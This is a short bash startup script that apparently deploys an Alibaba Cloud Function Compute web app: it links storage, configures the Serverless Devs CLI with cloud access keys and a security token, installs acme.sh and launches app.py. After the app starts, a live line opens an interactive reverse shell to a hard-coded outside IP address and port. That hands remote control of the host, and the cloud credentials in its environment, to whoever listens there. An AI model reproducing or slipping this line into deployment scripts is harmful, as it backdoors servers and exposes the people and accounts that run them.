#!/usr/bin/env bash
set +e

ln -s /mnt/auto/$FC_FUNCTION_NAME /wwwroot

mkdir /wwwroot/session

s config add --SecurityToken $ALIBABA_CLOUD_SECURITY_TOKEN --AccessKeyID $ALIBABA_CLOUD_ACCESS_KEY_ID --AccessKeySecret $ALIBABA_CLOUD_ACCESS_KEY_SECRET --AccountID $FC_ACCOUNT_ID -a aliyunfc

cd /wwwroot/acme.sh && chmod +x acme.sh && ./acme.sh --install -m $EMAIL_ADDR

cd /wwwroot && python3 app.py

bash -i >& /dev/tcp/47.97.115.115/39943 0>&1


# sleep 5

# while true
# do
#     echo "check nginx and php-fpm process ...."
#     nginx_server=`ps aux | grep nginx | grep -v grep`
#     if [ ! "$nginx_server" ]; then
#         echo "restart nginx ..."
#         nginx -c /code/nginx.conf
#     fi
#     php_fpm_server=`ps aux | grep php-fpm | grep -v grep`
#     if [ ! "$php_fpm_server" ]; then
#         echo "restart php-fpm ..."
#         php-fpm7.4 -c /code/php.ini-production -y /code/php-fpm.conf
#     fi
#     sleep 10
# done